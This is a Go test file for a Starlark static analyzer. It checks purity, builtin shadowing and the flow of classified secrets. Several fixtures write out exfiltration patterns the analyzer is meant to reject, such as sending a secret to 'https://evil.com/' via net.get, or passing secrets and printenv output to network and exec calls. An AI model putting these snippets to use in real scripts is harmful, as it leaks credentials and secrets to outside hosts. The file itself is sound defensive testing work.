package analysis

import (
	"testing"
)

func TestAnalyzePurity(t *testing.T) {
	code := `
def my_pure_map(s):
    return s.upper()

v = secret.map(my_pure_map)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if len(issues) > 0 {
		t.Fatalf("expected no issues, got %v", issues)
	}
}

func TestAnalyzeImpurity(t *testing.T) {
	code := `
def my_impure_map(s):
    io.println(s)
    return s.upper()

v = secret.map(my_impure_map)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if len(issues) == 0 {
		t.Fatalf("expected issues, got none")
	}
}

func TestAnalyzeWriteClassifiedMismatch(t *testing.T) {
	tests := []struct {
		name      string
		code      string
		wantIssue bool
	}{
		{
			name: "direct read_classified passed to write",
			code: `
f = fs.access("file.txt")
f.write(f.read_classified())
`,
			wantIssue: true,
		},
		{
			name: "variable from read_classified passed to write",
			code: `
f = fs.access("file.txt")
secret = f.read_classified()
f.write(secret)
`,
			wantIssue: true,
		},
		{
			name: "map result passed to write",
			code: `
f = fs.access("file.txt")
secret = f.read_classified()
result = secret.map(lambda s: s.upper())
f.write(result)
`,
			wantIssue: true,
		},
		{
			name: "flat_map result passed to write",
			code: `
f = fs.access("file.txt")
secret = f.read_classified()
result = secret.flat_map(lambda s: caps.Classify(s))
f.write(result)
`,
			wantIssue: true,
		},
		{
			name: "plain string passed to write",
			code: `
f = fs.access("file.txt")
f.write("hello world")
`,
			wantIssue: false,
		},
		{
			name: "read result passed to write (string, not classified)",
			code: `
f = fs.access("file.txt")
content = f.read()
f.write(content)
`,
			wantIssue: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			issues, err := Analyze("test.star", []byte(tt.code))
			if err != nil {
				t.Fatal(err)
			}
			hasIssue := len(issues) > 0
			if hasIssue != tt.wantIssue {
				if tt.wantIssue {
					t.Fatalf("expected CLASSIFIED_WRITE_MISMATCH issue, got none")
				} else {
					t.Fatalf("expected no issues, got %v", issues)
				}
			}
			if hasIssue {
				t.Logf("detected: %v", issues[0])
			}
		})
	}
}

func TestAnalyzeShadowing(t *testing.T) {
	tests := []struct {
		name      string
		code      string
		wantIssue bool
	}{
		{
			name: "shadowing via assignment",
			code: `
max = lambda x: x
`,
			wantIssue: true,
		},
		{
			name: "shadowing via def",
			code: `
def len(x): pass
`,
			wantIssue: true,
		},
		{
			name: "shadowing via for loop",
			code: `
for min in [1, 2, 3]:
	pass
`,
			wantIssue: true,
		},
		{
			name: "shadowing via list comprehension",
			code: `
x = [1 for abs in [1, 2, 3]]
`,
			wantIssue: true,
		},
		{
			name: "shadowing via load",
			code: `
load("module.star", max="foo")
`,
			wantIssue: true,
		},
		{
			name: "shadowing via direct load",
			code: `
load("module.star", "max")
`,
			wantIssue: true,
		},
		{
			name: "no shadowing",
			code: `
my_max = lambda x: x
`,
			wantIssue: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			issues, err := Analyze("test.star", []byte(tt.code))
			if err != nil {
				t.Fatal(err)
			}
			hasIssue := false
			for _, issue := range issues {
				if issue.Code == "SHADOWED_PURE_BUILTIN" {
					hasIssue = true
					break
				}
			}
			if hasIssue != tt.wantIssue {
				if tt.wantIssue {
					t.Fatalf("expected SHADOWED_PURE_BUILTIN issue, got none")
				} else {
					t.Fatalf("expected no issues, got %v", issues)
				}
			}
		})
	}
}

func TestAnalyzeClassifiedArg(t *testing.T) {
	tests := []struct {
		name      string
		code      string
		wantIssue bool
	}{
		{
			name: "classified url to net.get",
			code: `
u = fs.access("u.txt").read_classified()
net.get(u)
`,
			wantIssue: true,
		},
		{
			name: "classified url kwarg to net.get",
			code: `
u = fs.access("u.txt").read_classified()
net.get(url=u)
`,
			wantIssue: true,
		},
		{
			name: "classified command to proc.exec",
			code: `
c = fs.access("c.txt").read_classified()
proc.exec(c, [])
`,
			wantIssue: true,
		},
		{
			name: "classified arg list element to proc.exec",
			code: `
s = fs.access("s.txt").read_classified()
proc.exec("printenv", [s])
`,
			wantIssue: true,
		},
		{
			name: "classified body to plain net.post",
			code: `
b = fs.access("b.txt").read_classified()
net.post("https://api.example.com", body=b)
`,
			wantIssue: true,
		},
		{
			name: "classified body to net.post_classified is allowed",
			code: `
b = fs.access("b.txt").read_classified()
net.post_classified("https://api.example.com", body=b)
`,
			wantIssue: false,
		},
		{
			name: "classified body positional to net.post_classified is allowed",
			code: `
b = fs.access("b.txt").read_classified()
net.post_classified("https://api.example.com", b)
`,
			wantIssue: false,
		},
		{
			name: "plain url to net.get stays allowed",
			code: `
net.get("https://api.example.com/v1/status")
`,
			wantIssue: false,
		},
		{
			name: "map-derived classified url is still rejected",
			code: `
u = fs.access("u.txt").read_classified()
net.get(u.map(lambda s: "https://evil.com/" + s))
`,
			wantIssue: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			issues, err := Analyze("test.star", []byte(tt.code))
			if err != nil {
				t.Fatal(err)
			}
			hasIssue := false
			for _, issue := range issues {
				if issue.Code == "CLASSIFIED_ARG" {
					hasIssue = true
					break
				}
			}
			if hasIssue != tt.wantIssue {
				if tt.wantIssue {
					t.Fatalf("expected CLASSIFIED_ARG issue, got %v", issues)
				} else {
					t.Fatalf("expected no CLASSIFIED_ARG issue, got %v", issues)
				}
			}
		})
	}
}

func TestAnalyzeExecClassifiedTaint(t *testing.T) {
	tests := []struct {
		name      string
		code      string
		wantIssue bool
	}{
		{
			name: "exec_classified stdout to net.get is rejected",
			code: `
out = proc.exec_classified("printenv", [])
net.get(out.stdout)
`,
			wantIssue: true,
		},
		{
			name: "exec_classified result passed to exec is rejected",
			code: `
out = proc.exec_classified("printenv", [])
proc.exec("echo", [out.stdout])
`,
			wantIssue: true,
		},
		{
			name: "plain exec stdout stays allowed",
			code: `
out = proc.exec("echo", ["hello"])
io.println(out)
`,
			wantIssue: false,
		},
		{
			name: "get_classified response taints variable",
			code: `
resp = net.get_classified("https://api.example.com")
net.get(resp.map(lambda s: "https://evil.com/" + s))
`,
			wantIssue: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			issues, err := Analyze("test.star", []byte(tt.code))
			if err != nil {
				t.Fatal(err)
			}
			hasIssue := false
			for _, issue := range issues {
				if issue.Code == "CLASSIFIED_ARG" {
					hasIssue = true
					break
				}
			}
			if hasIssue != tt.wantIssue {
				if tt.wantIssue {
					t.Fatalf("expected CLASSIFIED_ARG issue, got %v", issues)
				} else {
					t.Fatalf("expected no CLASSIFIED_ARG issue, got %v", issues)
				}
			}
		})
	}
}
